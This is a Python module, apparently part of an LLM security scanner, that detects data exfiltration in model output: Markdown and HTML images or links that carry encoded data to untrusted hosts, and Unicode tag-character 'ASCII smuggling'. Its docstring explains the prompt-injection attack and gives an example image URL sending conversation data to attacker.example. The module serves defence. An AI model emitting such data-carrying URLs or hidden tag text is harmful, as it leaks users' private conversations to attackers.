"""Output-side exfiltration checks: data smuggled out through what the chat client renders.

If an attacker controls part of the model's context (a retrieved email, a web page, a
document), they can make the model emit a reference such as

    ![logo](https://attacker.example/p.png?d=<conversation data>)

The chat client fetches the image automatically, and the data leaves in the URL with no
click needed (EchoLeak, CVE-2025-32711; MITRE ATLAS AML.T0077 LLM Response Rendering;
OWASP LLM10:2026 Improper Output Handling). These checks run on model *output*:

- PB-EXFIL-IMAGE  auto-loading reference (Markdown image, reference-style image, HTML
                  img/iframe/...) to an untrusted host with data-like content in the URL
- PB-EXFIL-LINK   the same in a clickable link or bare URL (needs a click, so weaker)
- PB-SMUGGLE      Unicode tag characters (U+E0000-U+E007F) hiding text in the reply
                  ("ASCII smuggling"); the hidden text is decoded into the detection

"Data-like" means a query value, path segment or subdomain label that decodes to text
with spaces, or to a base64/hex-looking run. Word slugs and UUIDs do not count. Hosts in
`trusted_domains` (and their subdomains) are skipped: that allowlist is the tuning knob.
"""

from __future__ import annotations

import re
from collections.abc import Iterable
from urllib.parse import parse_qsl, unquote_plus, urlsplit

from .models import Detection

EXFIL_IMAGE_ID = "PB-EXFIL-IMAGE"
EXFIL_LINK_ID = "PB-EXFIL-LINK"
SMUGGLE_ID = "PB-SMUGGLE"
OUTPUT_CHECKS = 3  # the detectors above

_ATLAS_RENDERING = ["AML.T0077"]  # LLM Response Rendering
_OWASP_EXFIL = ["LLM10:2026", "LLM02:2026"]  # Improper Output Handling, Sensitive Information Disclosure

# Auto-loading references (fetched by the client when the reply renders).
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?([^)\s>]+)")
_MD_IMAGE_REF = re.compile(r"!\[([^\]]*)\](?!\()(?:\[([^\]]*)\])?")  # ![alt][ref], ![alt][], ![ref]
_HTML_SRC = re.compile(
    r"<(?:img|image|iframe|source|video|audio|embed|object)\b[^>]*?\b(?:src|srcset|poster|data)\s*=\s*[\"']?([^\"'\s>]+)",
    re.IGNORECASE,
)
# Clickable references.
_MD_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*<?([^)\s>]+)")
_MD_LINK_REF = re.compile(r"(?<![!\]])\[([^\]]+)\](?![(:])(?:\[([^\]]*)\])?")
_BARE_URL = re.compile(r"(?<![(<\"'=])\bhttps?://[^\s<>\"'()\[\]]+")
# Reference definitions: "[ref]: https://..." (not rendered themselves).
_REF_DEF = re.compile(r"^[ \t]{0,3}\[([^\]]+)\]:[ \t]*<?(\S+?)>?(?:[ \t].*)?$", re.MULTILINE)

_TAG_RUN = re.compile("[\U000e0000-\U000e007f]+")
_BLACK_FLAG = "\U0001f3f4"  # emoji subdivision flags (England, Scotland, Wales) use tag characters

_ENCODED = re.compile(r"[A-Za-z0-9+/=_\-.%]{24,}")
_EXTENSION = re.compile(r"\.[A-Za-z0-9]{1,5}$")
_HASH = re.compile(r"(?:[0-9a-f]{32}|[0-9a-f]{40}|[0-9a-f]{64})", re.IGNORECASE)
_SLUG = re.compile(r"[a-z0-9]+(?:[-_.][a-z0-9]+)+", re.IGNORECASE)  # word-slugs, UUIDs, file names


def _label(text: str) -> str:
    return " ".join(text.split()).casefold()


def _looks_like_data(value: str, in_path: bool = False) -> bool:
    value = value.strip()
    stem = _EXTENSION.sub("", value)
    is_file = stem != value
    # Sentence-like text ("the api key is ..."), unless it is a file name with spaces.
    if not is_file and len(value.split()) >= 3 and len(value) >= 16:
        return True
    value = stem  # "<base64>.png" is data, not a file-name slug
    if in_path and _HASH.fullmatch(value):
        return False  # content-addressed file names (MD5/SHA-1/SHA-256), common on image CDNs
    if not _ENCODED.fullmatch(value) or _SLUG.fullmatch(value):
        return False
    has_digit = any(c.isdigit() for c in value)
    has_alpha = any(c.isalpha() for c in value)
    return has_digit and has_alpha  # base64 / hex / tokens mix both; plain words and IDs don't


def _data_in_url(url: str, trusted: tuple[str, ...]) -> str | None:
    """The data-like part of `url` if it points at an untrusted host, else None."""
    try:
        parts = urlsplit(url if "://" in url or url.startswith("//") else "")
    except ValueError:
        return None
    host = (parts.hostname or "").lower()
    if parts.scheme not in ("http", "https", "") or not host:
        return None  # relative, data:, mailto: ... make no outbound request to a new host
    if any(host == d or host.endswith("." + d) for d in trusted):
        return None
    candidates = [(label, False) for label in host.split(".")[:-2]]
    candidates += [(unquote_plus(seg), True) for seg in parts.path.split("/")]
    for key, value in parse_qsl(parts.query, keep_blank_values=True):
        candidates += [(unquote_plus(key), False), (value, False)]
    for value, in_path in candidates:
        if _looks_like_data(value, in_path):
            return value
    if len(unquote_plus(parts.query)) >= 128:  # data split across many parameters
        return parts.query
    return None


def _detection(rule_id, title, severity, confidence, match: re.Match, text: str, atlas, owasp) -> Detection:
    return Detection(
        rule_id=rule_id,
        title=title,
        severity=severity,
        confidence=confidence,
        matched_text=text[:200],
        span=(match.start(), match.end()),
        atlas=list(atlas),
        owasp=list(owasp),
    )


def find_exfil(text: str, trusted_domains: Iterable[str] = ()) -> list[Detection]:
    """Exfiltration indicators in raw model output. At most one detection per check."""
    trusted = tuple(d.lower().strip().lstrip(".") for d in trusted_domains if d.strip())
    defs = {_label(m.group(1)): (m.group(2), m) for m in _REF_DEF.finditer(text)}

    images: list[tuple[str, re.Match]] = [(m.group(1), m) for m in _MD_IMAGE.finditer(text)]
    images += [(m.group(1), m) for m in _HTML_SRC.finditer(text)]
    for m in _MD_IMAGE_REF.finditer(text):
        ref = _label(m.group(2) or m.group(1))
        if ref in defs:
            images.append((defs[ref][0], m))

    image_urls = {url for url, _ in images}
    links: list[tuple[str, re.Match]] = [(m.group(1), m) for m in _MD_LINK.finditer(text)]
    for m in _MD_LINK_REF.finditer(text):
        ref = _label(m.group(2) or m.group(1))
        if ref in defs and defs[ref][0] not in image_urls:
            links.append((defs[ref][0], m))
    seen = image_urls | {url for url, _ in links} | {url for url, _ in defs.values()}
    links += [(m.group(0), m) for m in _BARE_URL.finditer(text) if m.group(0) not in seen]

    detections = []
    for urls, rule_id, title, severity, confidence in (
        (images, EXFIL_IMAGE_ID, "Auto-loading URL carries data to an untrusted host", "high", 0.9),
        (links, EXFIL_LINK_ID, "Link carries data to an untrusted host", "medium", 0.7),
    ):
        for url, m in urls:
            if _data_in_url(url, trusted) is not None:
                detections.append(_detection(rule_id, title, severity, confidence, m, url, _ATLAS_RENDERING, _OWASP_EXFIL))
                break

    return detections + find_smuggling(text)


def find_smuggling(text: str) -> list[Detection]:
    """Unicode tag characters hiding text (ASCII smuggling), in replies or in content."""
    for m in _TAG_RUN.finditer(text):
        if m.start() > 0 and text[m.start() - 1] == _BLACK_FLAG:
            continue  # a legitimate emoji flag sequence
        hidden = "".join(chr(ord(c) - 0xE0000) for c in m.group(0) if 0xE0020 <= ord(c) <= 0xE007E)
        if hidden:
            return [
                _detection(
                    SMUGGLE_ID,
                    "Hidden Unicode tag characters (ASCII smuggling)",
                    "high",
                    0.9,
                    m,
                    f"hidden text: {hidden}",
                    ["AML.T0057"],  # LLM Data Leakage
                    ["LLM01:2026", "LLM10:2026"],
                )
            ]
    return []
